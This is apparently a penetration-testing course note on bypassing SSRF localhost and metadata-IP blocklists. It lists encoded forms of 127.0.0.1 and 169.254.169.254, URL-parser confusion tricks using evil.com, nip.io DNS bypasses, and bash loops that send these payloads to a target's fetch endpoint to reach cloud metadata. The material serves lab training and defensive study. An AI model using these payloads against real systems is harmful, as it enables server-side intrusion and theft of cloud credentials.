---
tags: [vapt, ssrf, intermediate]
difficulty: intermediate
module: "13 - SSRF"
topic: "13.14 SSRF — Localhost Bypass (127.0.0.1, [::1], 0.0.0.0, 2130706433)"
portswigger_labs: ["SSRF with blacklist-based input filter"]
---

# 13.14 — SSRF Localhost Bypass

## Why Filters Block Specific IPs

```
COMMON SSRF FILTERS:
  Block: localhost
  Block: 127.0.0.1
  Block: 169.254.169.254

  These blocklists are bypassable with alternative representations!
  
  "127.0.0.1" is just one way to write localhost.
  There are MANY other ways!
```

---

## Alternative Representations of 127.0.0.1

```
DECIMAL:
  127.0.0.1

DECIMAL INTEGER:
  2130706433            ← 127*16777216 + 0*65536 + 0*256 + 1 = 2130706433
  
OCTAL:
  0177.0.0.1            ← 0177 in octal = 127 in decimal
  0177.00.00.01

HEX:
  0x7f000001            ← 0x7f = 127, 0x00 = 0, 0x01 = 1
  0x7f.0x0.0x0.0x1
  127.0.0.0x1           ← mix decimal and hex!
  
PADDED:
  127.1                 ← abbreviated notation (127.0.0.1 equivalent!)
  127.0.1               ← (127.0.0.1 equivalent!)
  0127.0.0.1            ← leading zero
  
IPV6:
  [::1]                 ← IPv6 loopback
  [0:0:0:0:0:0:0:1]
  [::ffff:127.0.0.1]    ← IPv4-mapped IPv6
  [0:0:0:0:0:ffff:7f00:0001]
  
DOMAIN THAT RESOLVES TO 127.0.0.1:
  localhost
  127.0.0.1.nip.io      ← wildcard DNS (nip.io service)
  loopback
  evil.com              ← if attacker controls evil.com DNS → point to 127.0.0.1!
```

---

## Alternative Representations of 169.254.169.254

```
AWS METADATA IP ALTERNATIVES:

DECIMAL INTEGER:
  2852039166            ← 169*16777216 + 254*65536 + 169*256 + 254

HEX:
  0xa9fea9fe
  0xA9FEA9FE

OCTAL:
  0251.0376.0251.0376

IPv6:
  [::ffff:169.254.169.254]
  [::ffff:a9fe:a9fe]

SHORT NOTATION:
  169.254.169.254 (no short form — must use hex/octal/int variants)

DNS REBINDING (advanced — see note 15):
  Point your domain to 169.254.169.254 via DNS

REDIRECT (via open redirect on allowed domain):
  https://target.com/redirect?url=http://169.254.169.254/...
```

---

## Testing IP Bypass Payloads

```bash
# TEST ALL VARIATIONS:
bypass_payloads=(
  "127.0.0.1"
  "localhost"
  "127.1"
  "127.0.1"
  "2130706433"          # decimal of 127.0.0.1
  "0x7f000001"          # hex
  "0177.0.0.1"          # octal
  "[::1]"               # IPv6
  "[::ffff:127.0.0.1]"  # IPv4-mapped IPv6
  "127.0.0.1.nip.io"    # DNS that resolves to 127.0.0.1
)

for payload in "${bypass_payloads[@]}"; do
  result=$(curl -s --max-time 5 \
    -X POST "https://target.com/fetch" \
    -d "url=http://$payload/" \
    -H "Cookie: session=YOURS" | head -c 100)
  echo "$payload → $result"
done

# FOR METADATA IP:
meta_payloads=(
  "169.254.169.254"
  "2852039166"
  "0xa9fea9fe"
  "0251.0376.0251.0376"
  "[::ffff:169.254.169.254]"
  "169.254.169.254.nip.io"
)

for payload in "${meta_payloads[@]}"; do
  result=$(curl -s --max-time 5 \
    -X POST "https://target.com/fetch" \
    -d "url=http://$payload/latest/meta-data/" \
    -H "Cookie: session=YOURS" | head -c 200)
  echo "$payload → $result"
done
```

---

## URL Parsing Confusion Bypass

```
URL PARSERS SOMETIMES DISAGREE ON HOW TO PARSE URLs!

ATTACKER TRICKS SERVER INTO FETCHING WRONG HOST:

EXAMPLE 1 — At-Sign (@) Confusion:
  url=http://expected.com@evil.com/
  
  Server parser: "hostname is expected.com" → allowed!
  HTTP library: "http://expected.com@evil.com/" → auth = expected.com, host = evil.com!
  → Actually fetches evil.com while filter thinks it's expected.com!
  
  APPLY TO SSRF:
  url=http://target.com@127.0.0.1/admin
  Filter: origin = target.com → allowed!
  Library: fetches 127.0.0.1/admin with auth=target.com!

EXAMPLE 2 — Fragment (#) Confusion:
  url=http://evil.com#target.com/expected
  Some parsers: host = evil.com (correct)
  Some old parsers: host = target.com (wrong!)

EXAMPLE 3 — Double Slash:
  url=http://127.0.0.1\@target.com/
  Backslash treated as forward slash by some libraries!

EXAMPLE 4 — Subdomain of Loopback:
  url=http://127.0.0.1.evil.com/
  If DNS resolves this to 127.0.0.1! (some services do this)
```

---

## nip.io and sslip.io Services

```
FREE WILDCARD DNS SERVICES:
  127.0.0.1.nip.io → resolves to 127.0.0.1
  10.0.0.1.nip.io → resolves to 10.0.0.1
  169.254.169.254.nip.io → resolves to 169.254.169.254
  
  Format: [ip].nip.io → resolves to [ip]
  
ALSO:
  127.0.0.1.sslip.io → resolves to 127.0.0.1
  192.168.1.1.sslip.io → resolves to 192.168.1.1
  
BYPASS USAGE:
  url=http://169.254.169.254.nip.io/latest/meta-data/
  
  Filter: "169.254.169.254" not in URL → allowed!
  DNS resolves to 169.254.169.254 anyway → SSRF!
  
  (Requires DNS resolution to be outbound — usually is!)
```

---

## Bypassing Port Filter

```
IF FILTER BLOCKS PORT 169.254.169.254 OR SPECIFIC PORTS:

TRY:
  Non-standard ports on services:
  Redis sometimes on :6380 instead of :6379
  
  0 as port:
  http://127.0.0.1:0/  → some libraries interpret as default port!

URL PORT BYPASS:
  http://127.0.0.1:80@evil.com:443/
  (auth = 127.0.0.1:80, actual host = evil.com:443)

NO PORT (implies :80):
  http://127.0.0.1/    → filters may check for explicit IP
  http://localhost/     → check if blocked
```

---

## Related Notes
- [[02 - Basic SSRF Fetching Internal URLs]] — basics
- [[09 - SSRF Cloud Metadata]] — 169.254.169.254 attacks
- [[15 - SSRF DNS Rebinding]] — advanced IP filter bypass
- [[16 - SSRF URL Parser Confusion]] — parser confusion
- [[17 - SSRF WAF Bypass]] — additional bypass techniques
